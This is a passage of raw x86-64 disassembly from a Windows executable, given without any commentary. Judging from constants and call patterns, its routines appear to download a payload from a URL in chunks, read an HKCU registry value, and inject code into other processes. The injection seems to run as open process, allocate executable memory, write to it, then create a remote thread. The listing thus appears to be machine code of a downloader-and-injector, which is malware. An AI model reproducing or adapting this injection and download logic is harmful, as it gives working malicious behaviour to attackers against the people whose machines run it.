   14000174d:	ff 15 45 7f 00 00    	call   *0x7f45(%rip)        # 0x140009698
   140001753:	49 89 c5             	mov    %rax,%r13
   140001756:	48 85 c0             	test   %rax,%rax
   140001759:	75 10                	jne    0x14000176b
   14000175b:	48 89 e9             	mov    %rbp,%rcx
   14000175e:	ff 15 2c 7f 00 00    	call   *0x7f2c(%rip)        # 0x140009690
   140001764:	31 c0                	xor    %eax,%eax
   140001766:	e9 88 01 00 00       	jmp    0x1400018f3
   14000176b:	45 31 db             	xor    %r11d,%r11d
   14000176e:	45 31 d2             	xor    %r10d,%r10d
   140001771:	4d 89 e0             	mov    %r12,%r8
   140001774:	45 31 c9             	xor    %r9d,%r9d
   140001777:	44 89 54 24 30       	mov    %r10d,0x30(%rsp)
   14000177c:	48 8d 15 db 38 00 00 	lea    0x38db(%rip),%rdx        # 0x14000505e
   140001783:	48 89 c1             	mov    %rax,%rcx
   140001786:	4c 89 5c 24 28       	mov    %r11,0x28(%rsp)
   14000178b:	4c 89 5c 24 20       	mov    %r11,0x20(%rsp)
   140001790:	ff 15 12 7f 00 00    	call   *0x7f12(%rip)        # 0x1400096a8
   140001796:	49 89 c4             	mov    %rax,%r12
   140001799:	48 85 c0             	test   %rax,%rax
   14000179c:	75 0f                	jne    0x1400017ad
   14000179e:	48 8b 1d eb 7e 00 00 	mov    0x7eeb(%rip),%rbx        # 0x140009690
   1400017a5:	4c 89 e9             	mov    %r13,%rcx
   1400017a8:	e9 01 01 00 00       	jmp    0x1400018ae
   1400017ad:	45 31 c9             	xor    %r9d,%r9d
   1400017b0:	45 31 c0             	xor    %r8d,%r8d
   1400017b3:	31 d2                	xor    %edx,%edx
   1400017b5:	48 89 c1             	mov    %rax,%rcx
   1400017b8:	4c 89 44 24 30       	mov    %r8,0x30(%rsp)
   1400017bd:	45 31 c0             	xor    %r8d,%r8d
   1400017c0:	44 89 4c 24 28       	mov    %r9d,0x28(%rsp)
   1400017c5:	44 89 4c 24 20       	mov    %r9d,0x20(%rsp)
   1400017ca:	45 31 c9             	xor    %r9d,%r9d
   1400017cd:	ff 15 ed 7e 00 00    	call   *0x7eed(%rip)        # 0x1400096c0
   1400017d3:	85 c0                	test   %eax,%eax
   1400017d5:	0f 84 c4 00 00 00    	je     0x14000189f
   1400017db:	31 d2                	xor    %edx,%edx
   1400017dd:	4c 89 e1             	mov    %r12,%rcx
   1400017e0:	ff 15 d2 7e 00 00    	call   *0x7ed2(%rip)        # 0x1400096b8
   1400017e6:	85 c0                	test   %eax,%eax
   1400017e8:	0f 84 b1 00 00 00    	je     0x14000189f
   1400017ee:	31 c9                	xor    %ecx,%ecx
   1400017f0:	45 31 ff             	xor    %r15d,%r15d
   1400017f3:	41 be 00 20 00 00    	mov    $0x2000,%r14d
   1400017f9:	89 4c 24 6c          	mov    %ecx,0x6c(%rsp)
   1400017fd:	b9 00 20 00 00       	mov    $0x2000,%ecx
   140001802:	e8 01 1b 00 00       	call   0x140003308
   140001807:	48 89 03             	mov    %rax,(%rbx)
   14000180a:	48 85 c0             	test   %rax,%rax
   14000180d:	0f 84 8c 00 00 00    	je     0x14000189f
   140001813:	48 8d 44 24 6c       	lea    0x6c(%rsp),%rax
   140001818:	48 89 44 24 50       	mov    %rax,0x50(%rsp)
   14000181d:	48 8d 44 24 70       	lea    0x70(%rsp),%rax
   140001822:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
   140001827:	48 8b 05 82 7e 00 00 	mov    0x7e82(%rip),%rax        # 0x1400096b0
   14000182e:	48 89 44 24 58       	mov    %rax,0x58(%rsp)
   140001833:	eb 1c                	jmp    0x140001851
   140001835:	48 89 03             	mov    %rax,(%rbx)
   140001838:	44 89 f8             	mov    %r15d,%eax
   14000183b:	48 03 03             	add    (%rbx),%rax
   14000183e:	8b 4c 24 6c          	mov    0x6c(%rsp),%ecx
   140001842:	48 8b 74 24 48       	mov    0x48(%rsp),%rsi
   140001847:	48 89 c7             	mov    %rax,%rdi
   14000184a:	f3 a4                	rep movsb (%rsi),(%rdi)
   14000184c:	44 03 7c 24 6c       	add    0x6c(%rsp),%r15d
   140001851:	4c 8b 4c 24 50       	mov    0x50(%rsp),%r9
   140001856:	48 8b 54 24 48       	mov    0x48(%rsp),%rdx
   14000185b:	41 b8 00 20 00 00    	mov    $0x2000,%r8d
   140001861:	4c 89 e1             	mov    %r12,%rcx
   140001864:	ff 54 24 58          	call   *0x58(%rsp)
   140001868:	85 c0                	test   %eax,%eax
   14000186a:	74 4e                	je     0x1400018ba
   14000186c:	8b 44 24 6c          	mov    0x6c(%rsp),%eax
   140001870:	85 c0                	test   %eax,%eax
   140001872:	74 46                	je     0x1400018ba
   140001874:	44 01 f8             	add    %r15d,%eax
   140001877:	41 39 c6             	cmp    %eax,%r14d
   14000187a:	73 bc                	jae    0x140001838
   14000187c:	48 8b 0b             	mov    (%rbx),%rcx
   14000187f:	8d 90 00 20 00 00    	lea    0x2000(%rax),%edx
   140001885:	49 89 d6             	mov    %rdx,%r14
   140001888:	e8 83 1a 00 00       	call   0x140003310
   14000188d:	48 85 c0             	test   %rax,%rax
   140001890:	75 a3                	jne    0x140001835
   140001892:	48 8b 0b             	mov    (%rbx),%rcx
   140001895:	e8 66 1a 00 00       	call   0x140003300
   14000189a:	31 d2                	xor    %edx,%edx
   14000189c:	48 89 13             	mov    %rdx,(%rbx)
   14000189f:	4c 89 e1             	mov    %r12,%rcx
   1400018a2:	48 8b 1d e7 7d 00 00 	mov    0x7de7(%rip),%rbx        # 0x140009690
   1400018a9:	ff d3                	call   *%rbx
   1400018ab:	4c 89 e9             	mov    %r13,%rcx
   1400018ae:	ff d3                	call   *%rbx
   1400018b0:	48 89 e9             	mov    %rbp,%rcx
   1400018b3:	ff d3                	call   *%rbx
   1400018b5:	e9 aa fe ff ff       	jmp    0x140001764
   1400018ba:	4c 89 e1             	mov    %r12,%rcx
   1400018bd:	4c 8b 25 cc 7d 00 00 	mov    0x7dcc(%rip),%r12        # 0x140009690
   1400018c4:	41 ff d4             	call   *%r12
   1400018c7:	4c 89 e9             	mov    %r13,%rcx
   1400018ca:	41 ff d4             	call   *%r12
   1400018cd:	48 89 e9             	mov    %rbp,%rcx
   1400018d0:	41 ff d4             	call   *%r12
   1400018d3:	44 89 7b 08          	mov    %r15d,0x8(%rbx)
   1400018d7:	b8 01 00 00 00       	mov    $0x1,%eax
   1400018dc:	45 85 ff             	test   %r15d,%r15d
   1400018df:	75 12                	jne    0x1400018f3
   1400018e1:	48 8b 0b             	mov    (%rbx),%rcx
   1400018e4:	e8 17 1a 00 00       	call   0x140003300
   1400018e9:	31 c0                	xor    %eax,%eax
   1400018eb:	48 89 03             	mov    %rax,(%rbx)
   1400018ee:	e9 71 fe ff ff       	jmp    0x140001764
   1400018f3:	48 81 c4 78 20 00 00 	add    $0x2078,%rsp
   1400018fa:	5b                   	pop    %rbx
   1400018fb:	5e                   	pop    %rsi
   1400018fc:	5f                   	pop    %rdi
   1400018fd:	5d                   	pop    %rbp
   1400018fe:	41 5c                	pop    %r12
   140001900:	41 5d                	pop    %r13
   140001902:	41 5e                	pop    %r14
   140001904:	41 5f                	pop    %r15
   140001906:	c3                   	ret
   140001907:	55                   	push   %rbp
   140001908:	57                   	push   %rdi
   140001909:	56                   	push   %rsi
   14000190a:	53                   	push   %rbx
   14000190b:	48 83 ec 48          	sub    $0x48,%rsp
   14000190f:	41 89 c8             	mov    %ecx,%r8d
   140001912:	48 89 d5             	mov    %rdx,%rbp
   140001915:	b9 3a 04 00 00       	mov    $0x43a,%ecx
   14000191a:	31 d2                	xor    %edx,%edx
   14000191c:	ff 15 5e 7b 00 00    	call   *0x7b5e(%rip)        # 0x140009480
   140001922:	48 89 c3             	mov    %rax,%rbx
   140001925:	48 85 c0             	test   %rax,%rax
   140001928:	74 31                	je     0x14000195b
   14000192a:	c7 44 24 20 40 00 00 	movl   $0x40,0x20(%rsp)
   140001931:	00 
   140001932:	31 d2                	xor    %edx,%edx
   140001934:	44 8b 45 08          	mov    0x8(%rbp),%r8d
   140001938:	41 b9 00 30 00 00    	mov    $0x3000,%r9d
   14000193e:	48 89 c1             	mov    %rax,%rcx
   140001941:	ff 15 69 7b 00 00    	call   *0x7b69(%rip)        # 0x1400094b0
   140001947:	48 8b 35 da 7a 00 00 	mov    0x7ada(%rip),%rsi        # 0x140009428
   14000194e:	48 85 c0             	test   %rax,%rax
   140001951:	48 89 c7             	mov    %rax,%rdi
   140001954:	75 09                	jne    0x14000195f
   140001956:	48 89 d9             	mov    %rbx,%rcx
   140001959:	ff d6                	call   *%rsi
   14000195b:	31 c0                	xor    %eax,%eax
   14000195d:	eb 70                	jmp    0x1400019cf
   14000195f:	45 31 c0             	xor    %r8d,%r8d
   140001962:	48 89 c2             	mov    %rax,%rdx
   140001965:	48 89 d9             	mov    %rbx,%rcx
   140001968:	4c 89 44 24 20       	mov    %r8,0x20(%rsp)
   14000196d:	44 8b 4d 08          	mov    0x8(%rbp),%r9d
   140001971:	4c 8b 45 00          	mov    0x0(%rbp),%r8
   140001975:	ff 15 55 7b 00 00    	call   *0x7b55(%rip)        # 0x1400094d0
   14000197b:	85 c0                	test   %eax,%eax
   14000197d:	74 2a                	je     0x1400019a9
   14000197f:	31 d2                	xor    %edx,%edx
   140001981:	31 c9                	xor    %ecx,%ecx
   140001983:	31 c0                	xor    %eax,%eax
   140001985:	45 31 c0             	xor    %r8d,%r8d
   140001988:	89 54 24 28          	mov    %edx,0x28(%rsp)
   14000198c:	49 89 f9             	mov    %rdi,%r9
   14000198f:	31 d2                	xor    %edx,%edx
   140001991:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   140001996:	48 89 d9             	mov    %rbx,%rcx
   140001999:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   14000199e:	ff 15 8c 7a 00 00    	call   *0x7a8c(%rip)        # 0x140009430
   1400019a4:	48 85 c0             	test   %rax,%rax
   1400019a7:	75 17                	jne    0x1400019c0
   1400019a9:	41 b9 00 80 00 00    	mov    $0x8000,%r9d
   1400019af:	45 31 c0             	xor    %r8d,%r8d
   1400019b2:	48 89 fa             	mov    %rdi,%rdx
   1400019b5:	48 89 d9             	mov    %rbx,%rcx
   1400019b8:	ff 15 fa 7a 00 00    	call   *0x7afa(%rip)        # 0x1400094b8
   1400019be:	eb 96                	jmp    0x140001956
   1400019c0:	48 89 c1             	mov    %rax,%rcx
   1400019c3:	ff d6                	call   *%rsi
   1400019c5:	48 89 d9             	mov    %rbx,%rcx
   1400019c8:	ff d6                	call   *%rsi
   1400019ca:	b8 01 00 00 00       	mov    $0x1,%eax
   1400019cf:	48 83 c4 48          	add    $0x48,%rsp
   1400019d3:	5b                   	pop    %rbx
   1400019d4:	5e                   	pop    %rsi
   1400019d5:	5f                   	pop    %rdi
   1400019d6:	5d                   	pop    %rbp
   1400019d7:	c3                   	ret
   1400019d8:	53                   	push   %rbx
   1400019d9:	48 83 ec 20          	sub    $0x20,%rsp
   1400019dd:	48 89 cb             	mov    %rcx,%rbx
   1400019e0:	48 85 c9             	test   %rcx,%rcx
   1400019e3:	74 17                	je     0x1400019fc
   1400019e5:	48 8b 09             	mov    (%rcx),%rcx
   1400019e8:	48 85 c9             	test   %rcx,%rcx
   1400019eb:	74 0f                	je     0x1400019fc
   1400019ed:	e8 0e 19 00 00       	call   0x140003300
   1400019f2:	31 c0                	xor    %eax,%eax
   1400019f4:	31 d2                	xor    %edx,%edx
   1400019f6:	48 89 03             	mov    %rax,(%rbx)
   1400019f9:	89 53 08             	mov    %edx,0x8(%rbx)
   1400019fc:	48 83 c4 20          	add    $0x20,%rsp
   140001a00:	5b                   	pop    %rbx
   140001a01:	c3                   	ret
   140001a02:	55                   	push   %rbp
   140001a03:	57                   	push   %rdi
   140001a04:	56                   	push   %rsi
   140001a05:	53                   	push   %rbx
   140001a06:	48 81 ec 48 02 00 00 	sub    $0x248,%rsp
   140001a0d:	31 c0                	xor    %eax,%eax
   140001a0f:	45 31 c0             	xor    %r8d,%r8d
   140001a12:	41 b9 19 00 02 00    	mov    $0x20019,%r9d
   140001a18:	48 89 cd             	mov    %rcx,%rbp
   140001a1b:	48 8d 7c 24 40       	lea    0x40(%rsp),%rdi
   140001a20:	b9 80 00 00 00       	mov    $0x80,%ecx
   140001a25:	89 d3                	mov    %edx,%ebx
   140001a27:	f3 ab                	rep stos %eax,(%rdi)
   140001a29:	31 c0                	xor    %eax,%eax
   140001a2b:	c7 44 24 30 00 02 00 	movl   $0x200,0x30(%rsp)
   140001a32:	00 
   140001a33:	48 8d 15 2c 36 00 00 	lea    0x362c(%rip),%rdx        # 0x140005066
   140001a3a:	89 44 24 34          	mov    %eax,0x34(%rsp)
   140001a3e:	48 8d 44 24 38       	lea    0x38(%rsp),%rax
   140001a43:	48 c7 c1 01 00 00 80 	mov    $0xffffffff80000001,%rcx
   140001a4a:	48 8d 74 24 40       	lea    0x40(%rsp),%rsi
   140001a4f:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140001a54:	ff 15 b6 79 00 00    	call   *0x79b6(%rip)        # 0x140009410
   140001a5a:	85 c0                	test   %eax,%eax
   140001a5c:	75 3b                	jne    0x140001a99
   140001a5e:	48 8d 44 24 30       	lea    0x30(%rsp),%rax
   140001a63:	48 8b 4c 24 38       	mov    0x38(%rsp),%rcx
   140001a68:	45 31 c0             	xor    %r8d,%r8d
   140001a6b:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   140001a70:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   140001a75:	4c 8d 4c 24 34       	lea    0x34(%rsp),%r9
   140001a7a:	48 8d 15 25 36 00 00 	lea    0x3625(%rip),%rdx        # 0x1400050a6
   140001a81:	ff 15 91 79 00 00    	call   *0x7991(%rip)        # 0x140009418
   140001a87:	48 8b 4c 24 38       	mov    0x38(%rsp),%rcx
   140001a8c:	85 c0                	test   %eax,%eax
   140001a8e:	48 8b 05 73 79 00 00 	mov    0x7973(%rip),%rax        # 0x140009408
   140001a95:	74 06                	je     0x140001a9d
   140001a97:	ff d0                	call   *%rax
   140001a99:	31 c0                	xor    %eax,%eax
   140001a9b:	eb 1f                	jmp    0x140001abc
   140001a9d:	ff d0                	call   *%rax
   140001a9f:	48 89 f1             	mov    %rsi,%rcx
   140001aa2:	e8 49 17 00 00       	call   0x1400031f0
   140001aa7:	48 39 d8             	cmp    %rbx,%rax
   140001aaa:	73 ed                	jae    0x140001a99
   140001aac:	48 89 f2             	mov    %rsi,%rdx
   140001aaf:	48 89 e9             	mov    %rbp,%rcx
   140001ab2:	e8 31 17 00 00       	call   0x1400031e8
   140001ab7:	b8 01 00 00 00       	mov    $0x1,%eax
   140001abc:	48 81 c4 48 02 00 00 	add    $0x248,%rsp
   140001ac3:	5b                   	pop    %rbx
   140001ac4:	5e                   	pop    %rsi
   140001ac5:	5f                   	pop    %rdi
   140001ac6:	5d                   	pop    %rbp
   140001ac7:	c3                   	ret
   140001ac8:	56                   	push   %rsi
   140001ac9:	53                   	push   %rbx
   140001aca:	48 83 ec 48          	sub    $0x48,%rsp
   140001ace:	48 8d 05 db 35 00 00 	lea    0x35db(%rip),%rax        # 0x1400050b0
   140001ad5:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   140001ada:	48 8d 05 d5 35 00 00 	lea    0x35d5(%rip),%rax        # 0x1400050b6
   140001ae1:	48 89 cb             	mov    %rcx,%rbx
   140001ae4:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   140001ae9:	31 c0                	xor    %eax,%eax
   140001aeb:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   140001af0:	48 85 c9             	test   %rcx,%rcx
   140001af3:	75 04                	jne    0x140001af9
   140001af5:	31 c0                	xor    %eax,%eax
   140001af7:	eb 28                	jmp    0x140001b21
   140001af9:	48 8d 74 24 28       	lea    0x28(%rsp),%rsi
   140001afe:	66 83 39 00          	cmpw   $0x0,(%rcx)
   140001b02:	74 f1                	je     0x140001af5
   140001b04:	48 8b 16             	mov    (%rsi),%rdx
   140001b07:	48 85 d2             	test   %rdx,%rdx
   140001b0a:	74 e9                	je     0x140001af5
   140001b0c:	48 89 d9             	mov    %rbx,%rcx
   140001b0f:	48 83 c6 08          	add    $0x8,%rsi
   140001b13:	e8 c8 16 00 00       	call   0x1400031e0
   140001b18:	85 c0                	test   %eax,%eax
   140001b1a:	75 e8                	jne    0x140001b04
   140001b1c:	b8 01 00 00 00       	mov    $0x1,%eax
   140001b21:	48 83 c4 48          	add    $0x48,%rsp
   140001b25:	5b                   	pop    %rbx
   140001b26:	5e                   	pop    %rsi
   140001b27:	c3                   	ret
   140001b28:	55                   	push   %rbp
   140001b29:	57                   	push   %rdi
   140001b2a:	56                   	push   %rsi
   140001b2b:	53                   	push   %rbx
   140001b2c:	48 83 ec 68          	sub    $0x68,%rsp
   140001b30:	31 c0                	xor    %eax,%eax
   140001b32:	b9 08 00 00 00       	mov    $0x8,%ecx
   140001b37:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140001b3c:	48 8d 7c 24 40       	lea    0x40(%rsp),%rdi
   140001b41:	48 8d 6c 24 20       	lea    0x20(%rsp),%rbp
   140001b46:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   140001b4b:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   140001b50:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   140001b55:	31 c0                	xor    %eax,%eax
   140001b57:	f3 ab                	rep stos %eax,(%rdi)
   140001b59:	48 8d 7c 24 30       	lea    0x30(%rsp),%rdi
   140001b5e:	e8 d8 fa ff ff       	call   0x14000163b
   140001b63:	ba 10 00 00 00       	mov    $0x10,%edx
   140001b68:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140001b6d:	e8 90 fe ff ff       	call   0x140001a02
   140001b72:	85 c0                	test   %eax,%eax
   140001b74:	89 c6                	mov    %eax,%esi
   140001b76:	74 40                	je     0x140001bb8
   140001b78:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140001b7d:	e8 46 ff ff ff       	call   0x140001ac8
   140001b82:	85 c0                	test   %eax,%eax
   140001b84:	0f 85 a7 00 00 00    	jne    0x140001c31
   140001b8a:	48 8d 15 2b 35 00 00 	lea    0x352b(%rip),%rdx        # 0x1400050bc
   140001b91:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140001b96:	e8 45 16 00 00       	call   0x1400031e0
   140001b9b:	85 c0                	test   %eax,%eax
   140001b9d:	74 19                	je     0x140001bb8
   140001b9f:	48 8d 15 1c 35 00 00 	lea    0x351c(%rip),%rdx        # 0x1400050c2
   140001ba6:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140001bab:	31 f6                	xor    %esi,%esi
   140001bad:	e8 2e 16 00 00       	call   0x1400031e0
   140001bb2:	85 c0                	test   %eax,%eax
   140001bb4:	40 0f 94 c6          	sete   %sil
   140001bb8:	48 89 ea             	mov    %rbp,%rdx
   140001bbb:	48 8d 0d 06 35 00 00 	lea    0x3506(%rip),%rcx        # 0x1400050c8
   140001bc2:	e8 0f fb ff ff       	call   0x1400016d6
   140001bc7:	85 c0                	test   %eax,%eax
   140001bc9:	75 04                	jne    0x140001bcf
   140001bcb:	31 db                	xor    %ebx,%ebx
   140001bcd:	eb 23                	jmp    0x140001bf2
   140001bcf:	31 c9                	xor    %ecx,%ecx
   140001bd1:	e8 6f f9 ff ff       	call   0x140001545
   140001bd6:	89 c3                	mov    %eax,%ebx
   140001bd8:	85 c0                	test   %eax,%eax
   140001bda:	74 ef                	je     0x140001bcb
   140001bdc:	48 89 ea             	mov    %rbp,%rdx
   140001bdf:	89 c1                	mov    %eax,%ecx
   140001be1:	e8 21 fd ff ff       	call   0x140001907
   140001be6:	85 c0                	test   %eax,%eax
   140001be8:	74 08                	je     0x140001bf2
   140001bea:	48 89 e9             	mov    %rbp,%rcx
   140001bed:	e8 e6 fd ff ff       	call   0x1400019d8
   140001bf2:	85 f6                	test   %esi,%esi
   140001bf4:	74 3b                	je     0x140001c31
   140001bf6:	48 89 fa             	mov    %rdi,%rdx
   140001bf9:	48 8d 0d f4 34 00 00 	lea    0x34f4(%rip),%rcx        # 0x1400050f4
   140001c00:	e8 d1 fa ff ff       	call   0x1400016d6
   140001c05:	85 c0                	test   %eax,%eax
   140001c07:	74 28                	je     0x140001c31
   140001c09:	b9 01 00 00 00       	mov    $0x1,%ecx
   140001c0e:	e8 32 f9 ff ff       	call   0x140001545
   140001c13:	85 c0                	test   %eax,%eax
   140001c15:	74 1a                	je     0x140001c31
   140001c17:	39 c3                	cmp    %eax,%ebx
   140001c19:	74 16                	je     0x140001c31
   140001c1b:	48 89 fa             	mov    %rdi,%rdx
   140001c1e:	89 c1                	mov    %eax,%ecx
   140001c20:	e8 e2 fc ff ff       	call   0x140001907
   140001c25:	85 c0                	test   %eax,%eax
   140001c27:	74 08                	je     0x140001c31
   140001c29:	48 89 f9             	mov    %rdi,%rcx
   140001c2c:	e8 a7 fd ff ff       	call   0x1400019d8
   140001c31:	48 89 e9             	mov    %rbp,%rcx
   140001c34:	e8 9f fd ff ff       	call   0x1400019d8
   140001c39:	48 89 f9             	mov    %rdi,%rcx
   140001c3c:	e8 97 fd ff ff       	call   0x1400019d8
   140001c41:	31 c0                	xor    %eax,%eax
   140001c43:	48 83 c4 68          	add    $0x68,%rsp
   140001c47:	5b                   	pop    %rbx
   140001c48:	5e                   	pop    %rsi
   140001c49:	5f                   	pop    %rdi
   140001c4a:	5d                   	pop    %rbp
   140001c4b:	c3                   	ret
   140001c4c:	90                   	nop
   140001c4d:	90                   	nop
   140001c4e:	90                   	nop
   140001c4f:	90                   	nop
   140001c50:	ff 25 72 7a 00 00    	jmp    *0x7a72(%rip)        # 0x1400096c8
   140001c56:	90                   	nop
   140001c57:	90                   	nop
   140001c58:	ff 25 62 7a 00 00    	jmp    *0x7a62(%rip)        # 0x1400096c0
   140001c5e:	90                   	nop
   140001c5f:	90                   	nop
   140001c60:	ff 25 52 7a 00 00    	jmp    *0x7a52(%rip)        # 0x1400096b8
   140001c66:	90                   	nop
   140001c67:	90                   	nop
   140001c68:	ff 25 42 7a 00 00    	jmp    *0x7a42(%rip)        # 0x1400096b0
   140001c6e:	90                   	nop
   140001c6f:	90                   	nop
   140001c70:	ff 25 32 7a 00 00    	jmp    *0x7a32(%rip)        # 0x1400096a8
   140001c76:	90                   	nop
   140001c77:	90                   	nop
   140001c78:	ff 25 22 7a 00 00    	jmp    *0x7a22(%rip)        # 0x1400096a0
   140001c7e:	90                   	nop
   140001c7f:	90                   	nop
   140001c80:	ff 25 12 7a 00 00    	jmp    *0x7a12(%rip)        # 0x140009698
   140001c86:	90                   	nop
   140001c87:	90                   	nop
   140001c88:	ff 25 02 7a 00 00    	jmp    *0x7a02(%rip)        # 0x140009690
   140001c8e:	90                   	nop
   140001c8f:	90                   	nop
   140001c90:	48 83 ec 28          	sub    $0x28,%rsp
   140001c94:	48 8b 05 65 23 00 00 	mov    0x2365(%rip),%rax        # 0x140004000
   140001c9b:	48 8b 00             	mov    (%rax),%rax
   140001c9e:	48 85 c0             	test   %rax,%rax
   140001ca1:	74 2a                	je     0x140001ccd
   140001ca3:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   140001caa:	00 00 00 00 
   140001cae:	66 90                	xchg   %ax,%ax
   140001cb0:	ff d0                	call   *%rax
   140001cb2:	48 8b 05 47 23 00 00 	mov    0x2347(%rip),%rax        # 0x140004000
   140001cb9:	48 8d 50 08          	lea    0x8(%rax),%rdx
   140001cbd:	48 8b 40 08          	mov    0x8(%rax),%rax
   140001cc1:	48 89 15 38 23 00 00 	mov    %rdx,0x2338(%rip)        # 0x140004000
   140001cc8:	48 85 c0             	test   %rax,%rax
   140001ccb:	75 e3                	jne    0x140001cb0
   140001ccd:	48 83 c4 28          	add    $0x28,%rsp
   140001cd1:	c3                   	ret
   140001cd2:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   140001cd9:	00 00 00 00 
   140001cdd:	0f 1f 00             	nopl   (%rax)
   140001ce0:	56                   	push   %rsi
   140001ce1:	53                   	push   %rbx
   140001ce2:	48 83 ec 28          	sub    $0x28,%rsp
   140001ce6:	48 8b 15 e3 37 00 00 	mov    0x37e3(%rip),%rdx        # 0x1400054d0
   140001ced:	48 8b 02             	mov    (%rdx),%rax
   140001cf0:	89 c1                	mov    %eax,%ecx
   140001cf2:	83 f8 ff             	cmp    $0xffffffff,%eax
   140001cf5:	74 39                	je     0x140001d30
   140001cf7:	85 c9                	test   %ecx,%ecx
   140001cf9:	74 20                	je     0x140001d1b
   140001cfb:	89 c8                	mov    %ecx,%eax
   140001cfd:	83 e9 01             	sub    $0x1,%ecx
   140001d00:	48 8d 1c c2          	lea    (%rdx,%rax,8),%rbx
   140001d04:	48 29 c8             	sub    %rcx,%rax
   140001d07:	48 8d 74 c2 f8       	lea    -0x8(%rdx,%rax,8),%rsi
   140001d0c:	0f 1f 40 00          	nopl   0x0(%rax)
   140001d10:	ff 13                	call   *(%rbx)
   140001d12:	48 83 eb 08          	sub    $0x8,%rbx
   140001d16:	48 39 f3             	cmp    %rsi,%rbx
   140001d19:	75 f5                	jne    0x140001d10
   140001d1b:	48 8d 0d 6e ff ff ff 	lea    -0x92(%rip),%rcx        # 0x140001c90
   140001d22:	48 83 c4 28          	add    $0x28,%rsp
   140001d26:	5b                   	pop    %rbx
   140001d27:	5e                   	pop    %rsi
   140001d28:	e9 f3 f6 ff ff       	jmp    0x140001420
   140001d2d:	0f 1f 00             	nopl   (%rax)
   140001d30:	31 c0                	xor    %eax,%eax
   140001d32:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   140001d39:	00 00 00 00 
   140001d3d:	0f 1f 00             	nopl   (%rax)
   140001d40:	44 8d 40 01          	lea    0x1(%rax),%r8d
   140001d44:	89 c1                	mov    %eax,%ecx
   140001d46:	4a 83 3c c2 00       	cmpq   $0x0,(%rdx,%r8,8)
   140001d4b:	4c 89 c0             	mov    %r8,%rax
   140001d4e:	75 f0                	jne    0x140001d40
   140001d50:	eb a5                	jmp    0x140001cf7
   140001d52:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   140001d59:	00 00 00 00 
   140001d5d:	0f 1f 00             	nopl   (%rax)
   140001d60:	56                   	push   %rsi
   140001d61:	53                   	push   %rbx
   140001d62:	48 83 ec 28          	sub    $0x28,%rsp
   140001d66:	8b 05 d4 62 00 00    	mov    0x62d4(%rip),%eax        # 0x140008040
   140001d6c:	85 c0                	test   %eax,%eax
   140001d6e:	74 10                	je     0x140001d80
   140001d70:	48 83 c4 28          	add    $0x28,%rsp
   140001d74:	5b                   	pop    %rbx
   140001d75:	5e                   	pop    %rsi
   140001d76:	c3                   	ret
   140001d77:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   140001d7e:	00 00 
   140001d80:	48 8b 15 49 37 00 00 	mov    0x3749(%rip),%rdx        # 0x1400054d0
   140001d87:	c7 05 af 62 00 00 01 	movl   $0x1,0x62af(%rip)        # 0x140008040
   140001d8e:	00 00 00 
   140001d91:	48 8b 02             	mov    (%rdx),%rax
   140001d94:	89 c1                	mov    %eax,%ecx
   140001d96:	83 f8 ff             	cmp    $0xffffffff,%eax
   140001d99:	74 35                	je     0x140001dd0
   140001d9b:	85 c9                	test   %ecx,%ecx
   140001d9d:	74 1c                	je     0x140001dbb
   140001d9f:	89 c8                	mov    %ecx,%eax
   140001da1:	83 e9 01             	sub    $0x1,%ecx
   140001da4:	48 8d 1c c2          	lea    (%rdx,%rax,8),%rbx
   140001da8:	48 29 c8             	sub    %rcx,%rax
   140001dab:	48 8d 74 c2 f8       	lea    -0x8(%rdx,%rax,8),%rsi
   140001db0:	ff 13                	call   *(%rbx)
   140001db2:	48 83 eb 08          	sub    $0x8,%rbx
   140001db6:	48 39 f3             	cmp    %rsi,%rbx
   140001db9:	75 f5                	jne    0x140001db0
   140001dbb:	48 8d 0d ce fe ff ff 	lea    -0x132(%rip),%rcx        # 0x140001c90
   140001dc2:	48 83 c4 28          	add    $0x28,%rsp
   140001dc6:	5b                   	pop    %rbx
   140001dc7:	5e                   	pop    %rsi
   140001dc8:	e9 53 f6 ff ff       	jmp    0x140001420
   140001dcd:	0f 1f 00             	nopl   (%rax)
   140001dd0:	31 c0                	xor    %eax,%eax
   140001dd2:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   140001dd9:	00 00 00 00 
   140001ddd:	0f 1f 00             	nopl   (%rax)
   140001de0:	44 8d 40 01          	lea    0x1(%rax),%r8d
   140001de4:	89 c1                	mov    %eax,%ecx
   140001de6:	4a 83 3c c2 00       	cmpq   $0x0,(%rdx,%r8,8)
   140001deb:	4c 89 c0             	mov    %r8,%rax
   140001dee:	75 f0                	jne    0x140001de0
   140001df0:	eb a9                	jmp    0x140001d9b
   140001df2:	90                   	nop
   140001df3:	90                   	nop
   140001df4:	90                   	nop
   140001df5:	90                   	nop
   140001df6:	90                   	nop
   140001df7:	90                   	nop
   140001df8:	90                   	nop
   140001df9:	90                   	nop
   140001dfa:	90                   	nop
   140001dfb:	90                   	nop
   140001dfc:	90                   	nop
   140001dfd:	90                   	nop
   140001dfe:	90                   	nop
   140001dff:	90                   	nop
   140001e00:	31 c0                	xor    %eax,%eax
   140001e02:	c3                   	ret
   140001e03:	90                   	nop
   140001e04:	90                   	nop
   140001e05:	90                   	nop
   140001e06:	90                   	nop
   140001e07:	90                   	nop
   140001e08:	90                   	nop
   140001e09:	90                   	nop
   140001e0a:	90                   	nop
